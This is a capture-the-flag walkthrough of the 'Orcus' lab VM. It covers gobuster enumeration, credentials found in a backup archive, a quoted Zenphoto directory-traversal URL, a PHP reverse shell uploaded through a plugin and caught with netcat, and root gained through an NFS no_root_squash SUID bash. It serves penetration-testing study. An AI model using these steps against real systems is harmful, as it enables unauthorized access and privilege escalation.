-<p>I looked around and the files point to a Exponent Content Management System installation. Trying the login and other pages gives a message that the site is down for maintenance and database is offline. But another potentially interesting find was <a href="http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php">http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php</a> which gives the message &ldquo;no direct access allowed&rdquo;.</p>
-
-<p>I looked for exploits for this CMS, but the interesting ones were from older versions. According to the RELEASE.md file, the version here is 2.3.8. I also found that this version should be vulnerable to CVE-2016-7095, but couldn&rsquo;t find a way to exploit it. Since the VM description emphasized enumeration, I fired up gobuster to see if there&rsquo;s more I might have missed on the web server:</p>
-
-<p><code>
-gobuster -u http://192.168.159.131/ -w /usr/share/wordlists/dirb/big.txt
-/.htpasswd (Status: 403)
-/.htaccess (Status: 403)
-/FCKeditor (Status: 301)
-/LICENSE (Status: 200)
-/admin (Status: 301)
-/backups (Status: 301)
-/cron (Status: 301)
-/external (Status: 301)
-/files (Status: 301)
-/framework (Status: 301)
-/install (Status: 301)
-/javascript (Status: 301)
-/phpmyadmin (Status: 301)
-/robots.txt (Status: 200)
-/server-status (Status: 403)
-/themes (Status: 301)
-/tmp (Status: 301)
-/webalizer (Status: 200)
-/zenphoto (Status: 301)
-</code></p>
-
-<p>This is interesting. The first thing I checked was the backups folder.</p>
-
-<p><code>
-[PARENTDIR] Parent Directory        -
-[ ] SimplePHPQuiz-Backupz.tar.gz    2016-10-31 20:29    210K
-[ ] ssh-creds.bak   2016-11-01 21:33    12
-</code></p>
-
-<p>Got a Forbidden error when trying to access the ssh creds file, but I was able to download the SimplePHPQuiz one. It contained the files for another application that doesn&rsquo;t seem to be installed. I did a search for passwords and got a hit:</p>
-
-<p><code>
-grep -l -r password *
-css/bootstrap.css.map
-includes/db_conn.php
-</code></p>
-
-<p>Inside db_conn.php I found some database credentials:</p>
-
-<p><code>php
-//Set the database access information as constants
-DEFINE ('DB_USER', 'dbuser');
-DEFINE ('DB_PASSWORD', 'dbpassword');
-DEFINE ('DB_HOST', 'localhost');
-DEFINE ('DB_NAME', 'quizdb');
-</code></p>
-
-<p>Moving on. The /cron folder contains a bunch of PHP files that I couldn&rsquo;t get anything interesting from. The /framework folder was another dead end. But when I went to /zenphoto, I saw that the Zenphoto 1.4.10 installation needed a last step of providing database credentials. It was configured with root@localhost and it got an access denied. In searchsploit I saw a local file inclusion exploit for this version of Zenphoto, so I tried to complete the installation with the previously discovered credentials. It worked and I was then prompted to create an admin user, which I did:</p>
-
-<p><img class="center" src="/images/pentest/orcus/admin.png" title="&lsquo;zenphoto admin&rsquo; &lsquo;zenphoto admin&rsquo;" ></p>
-
-<p>Next I looked at the LFI exploit:</p>
-
-<p>```
-Exploit: ZenPhoto 1.4.10 &ndash; Local File Inclusion</p>
-
-<pre><code>  URL: https://www.exploit-db.com/exploits/38841/
- Path: /usr/share/exploitdb/exploits/php/webapps/38841.txt
-</code></pre>
-
-<h1>Vulnerability Details:</h1>
-
-<p>Zen Photos pluginDoc.php PHP file is vulnerable to local file inclusion
-that allows attackers
-to read arbitrary server files outside of the current web directory by
-injecting &ldquo;../&rdquo; directory traversal
-characters, which can lead to sensitive information disclosure, code
-execution or DOS on the victims web server.</p>
-
-<h1>Local File Inclusion Codes:</h1>
-
-<p><a href="http://localhost/zenphoto-zenphoto-1.4.10/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../xampp">http://localhost/zenphoto-zenphoto-1.4.10/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../xampp</a>
-/phpinfo
-```</p>
-
-<p>The path didn&rsquo;t work for me. I kept looking around while logged in as admin and noticed a file upload plugin:</p>
-
-<p><img class="center" src="/images/pentest/orcus/plugins.png" title="&lsquo;zenphoto upload&rsquo; &lsquo;zenphoto upload&rsquo;" ></p>
-
-<p>I enabled the elFinder plugin and now I could upload arbitrary files:</p>
-
-<p><img class="center" src="/images/pentest/orcus/upload.png" title="&lsquo;zenphoto shell&rsquo; &lsquo;zenphoto shell&rsquo;" ></p>
-
-<h2>Flag #1 &ndash; Standard shell</h2>
-
-<p>With the PHP reverse shell uploaded, all I had to do was to go to it in the /uploaded directory and I got a shell and the first flag:</p>
-
-<p><code>
-nc -vnlp 9000
-listening on [any] 9000 ...
-connect to [192.168.159.129] from (UNKNOWN) [192.168.159.131] 38806
-Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux
- 12:02:20 up 25 min,  0 users,  load average: 0.07, 0.02, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ ls /var/www
-9bd556e5c961356857d6d527a7973560-zen-cart-v1.5.4-12302014.zip
-a0c4f0d176f87ceda9b9890af09ed644-Adem-master.zip
-b873fef091715964d207daa19d320a99-zenphoto-zenphoto-1.4.10.tar.gz
-flag.txt
-html
-zenphoto-zenphoto-1.4.10
-$ cat flag.txt
-868c889965b7ada547fae81f922e45c4
-</code></p>
-
-<h2>Flag #2 &ndash; Getting root</h2>
-
-<p>Remembering the NFS share that didn&rsquo;t get us anywhere earlier, I checked the <strong>/etc/exports</strong> file and found something really interesting and good for us:</p>
-
-<p><code>
-/tmp *(rw,no_root_squash)
-</code></p>
-
-<p>Not only we had write permissions on the share, which I haven&rsquo;t tried, but no root squash means that our root user can leave a SUID shell owned by root on the share for our www-data user after we copy it there with our low-privilege shell:</p>
-
-<p><code>
-$ cp /bin/bash root
-$ ls -l root
--rwxr-xr-x 1 www-data www-data 1109564 Apr  5 12:13 root
-</code></p>
-
-<p>Now chown to root:</p>
-
-<p><code>
-root@deck:/mnt# chown root:root root
-root@deck:/mnt# chmod +s root
-root@deck:/mnt# ls -l root
--rwsr-sr-x 1 root root 1109564 Apr  5  2019 root
-</code></p>
-
-<p>Execute the binary and you have root on the box and the 2nd flag:</p>
-
-<p><code>
-whoami
-root
-ls /root
-flag.txt
-cat /root/flag.txt
-807307b49314f822985d0410de7d8bfe
-</code></p>
-
-<p>I didn&rsquo;t poke around for more flags, so this is for this box!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ All generalizations are false, \
-| including this one.            |
-|                                |
-\ &mdash; Mark Twain                  /</p>
 
 <hr />
 
